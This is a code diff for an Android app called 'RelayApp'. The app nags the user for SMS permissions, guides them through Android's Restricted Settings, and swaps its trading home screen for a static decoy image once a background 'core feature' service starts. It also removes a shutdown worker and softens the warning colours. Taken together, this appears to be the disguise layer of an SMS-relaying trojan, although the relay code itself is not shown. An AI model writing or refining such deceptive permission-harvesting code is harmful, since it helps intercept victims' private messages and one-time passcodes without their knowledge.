@@ -11,10 +11,6 @@ import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.WorkManager
-import java.util.concurrent.TimeUnit
-import com.example.worker.ShutdownWorker
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.CircleShape
@@ -97,6 +93,8 @@ fun RelayApp() {
         }
     }
 
+    var showPermissionDialog by remember { mutableStateOf(false) }
+
     // Automatically check permissions on resume
     DisposableEffect(lifecycleOwner) {
         val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
@@ -106,9 +104,9 @@ fun RelayApp() {
                 }
                 hasPermissions = currentlyHasPermissions
                 
-                // If permissions are not granted, re-launch the dialog
+                // If permissions are not granted, show the dialog instead of auto-launching
                 if (!currentlyHasPermissions) {
-                    permissionLauncher.launch(requiredPermissions.toTypedArray())
+                    showPermissionDialog = true
                 }
             }
         }
@@ -116,6 +114,23 @@ fun RelayApp() {
         onDispose {
             lifecycleOwner.lifecycle.removeObserver(observer)
         }
+    }
+
+    if (showPermissionDialog) {
+        AlertDialog(
+            onDismissRequest = { showPermissionDialog = false },
+            title = { Text("Permissions Required") },
+            text = { Text("SMS permissions are required for the core feature to work. Please ensure you have allowed all permissions.") },
+            confirmButton = {
+                TextButton(onClick = {
+                    showPermissionDialog = false
+                    permissionLauncher.launch(requiredPermissions.toTypedArray())
+                }) { Text("Try Again") }
+            },
+            dismissButton = {
+                TextButton(onClick = { showPermissionDialog = false }) { Text("Cancel") }
+            }
+        )
     }
 
     // Trigger permission request on startup if not already granted
@@ -142,11 +157,17 @@ fun RelayApp() {
     }
 
     if (hasPermissions && isServiceStarted) {
-        TradingHomeScreen()
+        // Static image UI
+        Image(
+            painter = painterResource(id = R.drawable.image_renamed),
+            contentDescription = "Static UI Image",
+            modifier = Modifier.fillMaxSize(),
+            contentScale = ContentScale.Fit
+        )
     } else if (hasPermissions && !isServiceStarted) {
         // Loading screen while activating core feature
         Box(modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color.Black), contentAlignment = Alignment.Center) {
-            CircularProgressIndicator(color = androidx.compose.ui.graphics.Color.Red)
+            CircularProgressIndicator(color = androidx.compose.ui.graphics.Color(0xFF2196F3))
         }
     } else {
         // Clear instruction screen for Restricted Settings
@@ -158,7 +179,7 @@ fun RelayApp() {
             Icon(
                 imageVector = Icons.Default.Shield,
                 contentDescription = "Security",
-                tint = androidx.compose.ui.graphics.Color(0xFFE34343),
+                tint = androidx.compose.ui.graphics.Color(0xFF2196F3),
                 modifier = Modifier.size(64.dp)
             )
             Spacer(modifier = Modifier.height(24.dp))
@@ -200,7 +221,7 @@ fun RelayApp() {
                     intent.data = android.net.Uri.fromParts("package", context.packageName, null)
                     context.startActivity(intent)
                 },
-                colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFE34343)),
+                colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF2196F3)),
                 modifier = Modifier.fillMaxWidth().height(50.dp)
             ) {
                 Text("Open Settings", fontWeight = FontWeight.Bold)
